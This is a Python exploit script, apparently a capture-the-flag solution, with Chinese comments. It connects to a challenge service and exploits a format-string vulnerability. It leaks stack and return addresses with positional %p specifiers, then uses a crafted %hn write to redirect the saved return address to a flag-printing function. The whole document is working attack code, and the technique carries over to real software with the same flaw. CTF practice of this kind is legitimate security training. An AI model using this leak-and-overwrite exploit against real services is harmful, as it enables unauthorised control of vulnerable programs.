import socket, struct, re

HOST, PORT = '172.17.0.13', 12815
TARGET     = 0x40129A          # ret2text 目标 (flag 函数)
PROMPT     = b'[LOG] entry> '  # ★ 提示符没有换行, 所以绝不能用 readline()
p64 = lambda x: struct.pack('<Q', x)

s = socket.create_connection((HOST, PORT), timeout=6)


def recv_until(tok, timeout=4.0):
    """读到提示符为止 —— 提示符不带 \n, readline() 会一直阻塞/错位。"""
    s.settimeout(timeout)
    buf = b''
    try:
        while tok not in buf:
            d = s.recv(4096)
            if not d:
                break
            buf += d
    except socket.timeout:
        pass
    return buf


def recv_all(timeout=3.0):
    s.settimeout(timeout)
    buf = b''
    try:
        while True:
            d = s.recv(4096)
            if not d:
                break
            buf += d
    except socket.timeout:
        pass
    return buf


recv_until(PROMPT)                                  # ★ 吃掉 banner

# ── 阶段 1: 泄露 ──
#   %7$ = sub 序言 mov [rbp-8], rdi 存下的 &s
#   %9$ = sub 的返回地址
s.sendall(b'%7$p|%9$p\n')
vals = [int(x, 16) for x in re.findall(rb'0x[0-9a-f]+', recv_until(PROMPT))]
s_addr, cur_ret = vals[0], vals[1]

t = s_addr - 8                 # call 压的返回地址, 恒在 s 下面一格
assert (cur_ret & ~0xffff) == (TARGET & ~0xffff), '高字节不同, 需改 3 字节'
print('&s = %#x   ret = %#x   t = %#x' % (s_addr, cur_ret, t))

# ── 阶段 2: 用 %hn 把 t 的低 2 字节写成 0x129A ──
#   槽号: s[0] = %10$  ->  s[24] = %13$   (5 个寄存器槽 %1$-%5$)
PTR   = 13
instr = b'%' + str(TARGET & 0xffff).encode() + b'c%' + str(PTR).encode() + b'$hn'
pad   = 24 - len(instr)        # 填充写在 hn 之后 -> 不进计数
payload = instr + b'.' * pad + p64(t)
assert len(payload) <= 511

s.sendall(payload + b'\n')
data = recv_all()

m = re.search(rb'[A-Za-z0-9_]+\{[^}]*\}', data)
print(m.group().decode() if m else data[-300:])
